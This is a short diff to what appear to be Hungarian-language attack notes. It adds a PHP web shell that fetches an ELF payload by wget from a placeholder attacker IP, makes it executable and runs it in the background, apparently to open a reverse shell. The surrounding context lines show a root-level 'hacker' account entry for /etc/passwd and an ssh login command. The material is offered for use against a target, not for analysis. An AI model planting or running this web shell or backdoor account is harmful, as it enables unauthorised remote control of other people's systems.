@@ -20,3 +20,24 @@ openssl passwd -5 "alma"
 hacker:JELSZO:0:0::/root:/bin/bash
 
 ssh <username>@<hostname>
+
+<?php
+// shell.php - Reverse shell telepítő és indító
+// Használat: http://célgép/shell.php
+
+$ip = "SAJÁT_IP";  // IDE ÍRD AZ IP-D
+$port = "4444";     // Port
+
+$bash_script = "cd /tmp; 
+rm -f /tmp/shell.elf; 
+wget http://{$ip}:8000/shell.elf -O /tmp/shell.elf; 
+chmod +x /tmp/shell.elf; 
+/tmp/shell.elf &";
+
+echo "Futtatás: " . htmlspecialchars($bash_script) . "\n\n";
+
+// Futtatás bash-ben
+system($bash_script);
+
+echo "Kész! Ha nem működik, próbáld kézzel.\n";
+?>
